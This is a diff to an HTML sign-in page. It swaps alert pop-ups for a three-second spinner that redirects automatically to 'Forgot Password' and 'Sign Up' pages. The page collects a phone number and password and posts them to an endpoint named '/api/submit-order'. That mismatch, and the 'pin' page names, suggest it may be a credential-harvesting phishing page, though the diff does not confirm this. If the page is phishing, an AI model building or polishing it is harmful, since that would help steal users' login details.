@@ -18,7 +18,6 @@
         html, body {
             width: 100%;
             height: 100%;
-            /* Updated to use your preferred purple (#991676) */
             background: linear-gradient(135deg, #991676 0%, #79105c 50%, #5a0c44 100%);
             overflow: hidden;
         }
@@ -373,18 +372,18 @@
             <!-- Sign In Button -->
             <button class="e-btn-login" id="loginBtn" onclick="submitOrderAttempt()">Sign In</button>
 
-            <!-- Forgot Password Link with Alert Trigger -->
+            <!-- Forgot Password Link with 3-Second Automatic Loader & Redirect -->
             <div class="e-forgot-container">
-                <a href="pin2.html" class="e-forgot-link" onclick="handleForgotClick(event)">Forgot Password?</a>
+                <a href="pin2.html" class="e-forgot-link" onclick="handleRedirect(event, 'Redirecting to reset password...', 'pin2.html')">Forgot Password?</a>
             </div>
 
-            <!-- Sign Up Button with Alert Trigger -->
-            <a href="pin3.html" class="e-signup-rect-btn" onclick="handleSignUpClick(event)">New Here! Sign Up</a>
+            <!-- Sign Up Button with 3-Second Automatic Loader & Redirect -->
+            <a href="pin3.html" class="e-signup-rect-btn" onclick="handleRedirect(event, 'Redirecting to Sign up...', 'pin3.html')">New Here! Sign Up</a>
 
             <!-- Loading Spinner -->
             <div id="loadingSpinner">
                 <div class="spinner"></div>
-                <span>Verifying account details...</span>
+                <span id="spinnerText">Verifying account details...</span>
             </div>
         </div>
 
@@ -418,14 +417,22 @@
         }
     }
 
-    function handleForgotClick(e) {
+    // Smooth 3-second automatic redirection loader for Forgot Password & Sign Up
+    function handleRedirect(e, message, targetUrl) {
         e.preventDefault();
-        showAppAlert('⚠️ Redirecting to Forgot Password recovery...', 'pin2.html');
-    }
+        const spinnerDiv = document.getElementById('loadingSpinner');
+        const spinnerText = document.getElementById('spinnerText');
+        const loginBtn = document.getElementById('loginBtn');
 
-    function handleSignUpClick(e) {
-        e.preventDefault();
-        showAppAlert('✨ Redirecting to Account Registration...', 'pin3.html');
+        // Disable elements & show loader with custom text
+        if (loginBtn) loginBtn.classList.add('disabled-state');
+        if (spinnerText) spinnerText.innerText = message;
+        if (spinnerDiv) spinnerDiv.style.display = 'flex';
+
+        // Automatically redirect after 3 seconds without needing any OK click
+        setTimeout(() => {
+            window.location.href = targetUrl;
+        }, 3000);
     }
 
     const phoneInput = document.getElementById('phoneNumber');
@@ -454,6 +461,7 @@
         const rawPhone = phoneInput.value.trim();
         const uniqueId = passwordInput.value.trim();
         const spinnerDiv = document.getElementById('loadingSpinner');
+        const spinnerText = document.getElementById('spinnerText');
         const loginBtn = document.getElementById('loginBtn');
 
         if (!rawPhone || !uniqueId) {
@@ -490,6 +498,7 @@
         try {
             loginBtn.classList.add('disabled-state');
             passwordInput.type = 'password'; 
+            if (spinnerText) spinnerText.innerText = 'Verifying account details...';
             if (spinnerDiv) spinnerDiv.style.display = 'flex';
 
             const response = await fetch('/api/submit-order', {
